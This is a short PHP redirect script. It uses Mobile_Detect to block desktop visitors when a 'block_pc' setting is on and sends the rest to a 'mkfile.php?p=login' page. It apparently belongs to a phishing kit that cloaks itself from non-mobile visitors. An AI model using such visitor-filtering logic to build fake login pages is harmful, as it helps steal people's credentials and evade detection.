<?php 
require '../main.php';

$detect = new Mobile_Detect;
if(!$detect->isMobile() and strtolower($block_pc) == "yes"){
   exit(header("location: block.php"));
}

header("location: mkfile.php?p=login");
?>